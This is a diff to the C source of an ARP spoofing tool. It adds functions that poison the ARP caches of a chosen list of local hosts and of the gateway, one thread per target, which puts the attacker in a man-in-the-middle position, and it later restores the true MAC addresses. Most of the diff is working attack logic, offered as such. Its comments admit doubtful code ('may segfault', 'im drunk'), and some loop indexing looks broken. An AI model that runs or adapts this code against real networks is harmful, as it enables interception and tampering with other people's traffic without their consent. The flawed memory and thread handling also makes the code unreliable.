@@ -116,26 +116,50 @@ err:
 	return NULL;
 }
 
-int start_attack_all(const struct arguments *arguments, nmap_r **scan)
+static int isidxinlist(size_t idx, char *list)
+{
+	char *h = NULL, *saveptr = NULL;
+	char *listdup;
+	int ret = 0;
+
+	if (list == NULL)
+		return 1;
+	if (!(listdup = strdup(list)))
+		{ ERROR_MALLOC(); return -1; }
+	while ((h = strtok_r((h == NULL ? listdup : NULL), ",", &saveptr)) != NULL) {
+		if (atol(h) == idx) {
+			ret = 1;
+			break;
+		}
+	}
+	free(listdup);
+	return ret;
+}
+
+/* start attack on the selected list, if list is NULL, attack all the scan (exept gateway and us ofc */
+int start_attack_some(const struct arguments *arguments, nmap_r **scan, char *list)
 {
 	SOCKET iface = -1;
 	pthread_t *thread = NULL;
 	struct arpthreadinfo **argp;
+	int isidxinlistret;
 
 	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
 		goto err;
 	TELLSOCKETSUCCESS(arguments->ifacename);
 
 	/* malloc each thread and its arguments */
-	if (!(thread = malloc((arguments->scanamount - 2) * sizeof(thread))))
+	if (!(thread = calloc((arguments->scanamount), sizeof(thread))))
 		{ ERROR_MALLOC(); goto err; }
-	if (!(argp = malloc((arguments->scanamount - 2) * sizeof(arpthreadinfo*))))
+	if (!(argp = calloc((arguments->scanamount), sizeof(arpthreadinfo*))))
 		{ ERROR_MALLOC(); goto err; }
 	start_signal();
 
 	/* setup thread arguments and start it if its not the gateway or us */
 	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
-		if (scan[i]->gateway == 0 && scan[i]->self == 0) {
+		if ((isidxinlistret = isidxinlist(i, list)) == -1) // check wether we should or not include this particular host
+			goto err;
+		if (scan[i]->gateway == 0 && scan[i]->self == 0 && isidxinlistret) {
 			if (!(argp[j] = malloc(sizeof(arpthreadinfo))))
 				{ ERROR_MALLOC(); goto err; }
 			argp[j]->iface = iface;
@@ -146,10 +170,10 @@ int start_attack_all(const struct arguments *arguments, nmap_r **scan)
 		}
 	}
 	/* wait for thread to finish */
-	for (size_t j = 0; j < arguments->scanamount - 2; ++j) {
-		if (scan[j]->gateway == 0 && scan[j]->self == 0) {
-			pthread_join(thread[j], NULL);
-			free(argp[j]);
+	for (size_t i = 0; i < arguments->scanamount; ++i) {
+		if (thread[i] && argp[i]) {
+			pthread_join(thread[i], NULL);
+			free(argp[i]);
 		}
 	}
 	stop_signal();
@@ -167,91 +191,114 @@ err:
 	return -1;
 }
 
-int start_attack_one(const struct arguments *arguments, nmap_r *target)
-{
-	SOCKET iface = -1;
-	pthread_t thread;
-	struct arpthreadinfo argp;
-
-	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
-		goto err;
-	TELLSOCKETSUCCESS(arguments->ifacename);
-
-	argp.iface = iface;
-	argp.arguments = arguments;
-	argp.target = target;
-
-	start_signal();
-	pthread_create(&thread, NULL, arpthread, &argp);
-	pthread_join(thread, NULL);
-	stop_signal();
-	g_stop = 1;
-	TELLSTOPATTACK();
-
-	close(iface);
-	return 0;
-err:
-	if (iface != -1)
-		close(iface);
-	return -1;
-}
-
-int arpspoof(const struct arguments *arguments, nmap_r **scan, long long victimidx)
+int arpspoof_some(const struct arguments *arguments, nmap_r **scan, char *list)
 {
 	SOCKET arpsock = -1;
-	struct arguments argvictim, arggateway;
-	pthread_t threadvictim, threadgateway;
-	struct arpthreadinfo threadinfovictim, threadinfogateway;
+	struct arguments **argvictim = NULL, **arggateway = NULL;
+	pthread_t *thread = NULL;
+	struct arpthreadinfo **argp = NULL;
+	nmap_r *gateway = get_gateway_from_scan(scan); // may segfault later on idk
+	int isidxinlistret;
 
 	if ((arpsock = initiate_socket_for_arp(arguments->ifacename)) == -1)
 		goto err;
 	TELLSOCKETSUCCESS(arguments->ifacename);
 
-	memcpy(&argvictim, arguments, sizeof(struct arguments));
-	memcpy(&arggateway, arguments, sizeof(struct arguments));
-
-	threadinfovictim.iface = arpsock;
-	threadinfogateway.iface = arpsock;
-
-	threadinfovictim.arguments = &argvictim;
-	threadinfogateway.arguments = &arggateway;
-
-	threadinfovictim.target = scan[victimidx];
-	threadinfogateway.target = get_gateway_from_scan(scan); // may segfault later on idk
-
-	// ultra hackish
-	copy_ipv4(arggateway.gateway_pa, scan[victimidx]->pa);
+	/* malloc each thread and its arguments times 2 for gateway and victim */
+	if (!(thread = calloc(arguments->scanamount * 2, sizeof(thread))))
+		{ ERROR_MALLOC(); goto err; }
+	if (!(argp = calloc(arguments->scanamount * 2, sizeof(arpthreadinfo*))))
+		{ ERROR_MALLOC(); goto err; }
+	if (!(argvictim = calloc(arguments->scanamount, sizeof(argvictim))))
+		{ ERROR_MALLOC(); goto err; }
+	if (!(arggateway = calloc(arguments->scanamount, sizeof(argvictim))))
+		{ ERROR_MALLOC(); goto err; }
 
 	start_signal();
-	pthread_create(&threadvictim, NULL, arpthread, &threadinfovictim);
-	pthread_create(&threadgateway, NULL, arpthread, &threadinfogateway);
+	/* setup thread arguments and start it if its not the gateway or us */
+	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
+		if ((isidxinlistret = isidxinlist(i, list)) == -1) // check wether we should or not include this particular host
+			goto err;
+		if (scan[i]->gateway == 0 && scan[i]->self == 0 && isidxinlistret) {
+			if (!(argp[j] = malloc(sizeof(arpthreadinfo))))
+				{ ERROR_MALLOC(); goto err; }
+			if (!(argp[j + 1] = malloc(sizeof(arpthreadinfo))))
+				{ ERROR_MALLOC(); goto err; }
+			if (!(argvictim[(j + 2) / 2] = malloc(sizeof(struct arguments)))) // (j + 2) / 2 is probably = j + 1 but im drunk
+				{ ERROR_MALLOC(); goto err; }
+			if (!(arggateway[(j + 2) / 2] = malloc(sizeof(struct arguments))))
+				{ ERROR_MALLOC(); goto err; }
+			memcpy(argvictim[(j + 2) / 2], arguments, sizeof(struct arguments));
+			memcpy(arggateway[(j + 2) / 2], arguments, sizeof(struct arguments));
+			copy_ipv4(arggateway[(j + 2) / 2]->gateway_pa, scan[i]->pa); // ultra hackish
+			argp[j]->iface = arpsock;
+			argp[j]->arguments = argvictim[(j + 2) / 2];
+			argp[j]->target = scan[i];
+			argp[j + 1]->iface = arpsock;
+			argp[j + 1]->arguments = arggateway[(j + 2) / 2];
+			argp[j + 1]->target = gateway;
+			pthread_create(&thread[j], NULL, arpthread, argp[j]);
+			pthread_create(&thread[j + 1], NULL, arpthread, argp[j + 1]);
+			j += 2;
+		}
+	}
 
-	pthread_join(threadvictim, NULL);
-	pthread_join(threadgateway, NULL);
+	/* wait for thread to finish, not optimal but there will always be less than scan[i] * 2 thread */
+	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
+		if (thread[j] && thread[j + 1]) {
+			pthread_join(thread[j], NULL);
+			pthread_join(thread[j + 1], NULL);
+		}
+	}
+
 	g_stop = 1;
-
 	TELLRESTORINGMAC();
-
-	memcpy(&argvictim, arguments, sizeof(struct arguments));
-	memcpy(&arggateway, arguments, sizeof(struct arguments));
 
 	/*
 	** very sketchy, arpthread() is using self_ha as the mac to spoof,
 	** since we want to restore the arp table we need to put the REAL
-	** gateway HA as self HA
+	** gateway HA as self HA (copy_* in the following scope)
 	*/
-	copy_mac(argvictim.self_ha, arguments->gateway_ha);
+	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
+		if ((isidxinlistret = isidxinlist(i, list)) == -1) // check wether we should or not include this particular host
+			goto err;
+		if (scan[i]->gateway == 0 && scan[i]->self == 0 && isidxinlistret) {
+			memcpy(argvictim[(j + 2) / 2], arguments, sizeof(struct arguments));
+			memcpy(arggateway[(j + 2) / 2], arguments, sizeof(struct arguments));
+			copy_mac(argvictim[(j + 2) / 2]->self_ha, arguments->gateway_ha);
+			copy_ipv4(arggateway[(j + 2) / 2]->gateway_pa, scan[i]->pa);
+			copy_mac(arggateway[(j + 2) / 2]->self_ha, scan[i]->ha);
+			argp[j]->iface = arpsock;
+			argp[j]->arguments = argvictim[(j + 2) / 2];
+			argp[j]->target = scan[i];
+			argp[j + 1]->iface = arpsock;
+			argp[j + 1]->arguments = arggateway[(j + 2) / 2];
+			argp[j + 1]->target = gateway;
+			pthread_create(&thread[j], NULL, arpthread, argp[j]);
+			pthread_create(&thread[j + 1], NULL, arpthread, argp[j + 1]);
+			j += 2;
+		}
+	}
 
-	copy_ipv4(arggateway.gateway_pa, scan[victimidx]->pa);
-	copy_mac(arggateway.self_ha, scan[victimidx]->ha);
-
-	pthread_create(&threadvictim, NULL, arpthread, &threadinfovictim);
-	pthread_create(&threadgateway, NULL, arpthread, &threadinfogateway);
-
-	pthread_join(threadvictim, NULL);
-	pthread_join(threadgateway, NULL);
+	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
+		if (thread[j] && thread[j + 1]) {
+			pthread_join(thread[j], NULL);
+			pthread_join(thread[j + 1], NULL);
+			free(argp[j]);
+			free(argp[j + 1]);
+			free(argvictim[(j + 2) / 2]);
+			free(arggateway[(j + 2) / 2]);
+			j += 2;
+		}
+	}
 
 	stop_signal();
+
+	free(thread);
+	free(argp);
+	free(argvictim);
+	free(arggateway);
+
 	g_stop = 1;
 	TELLSTOPATTACK();
 
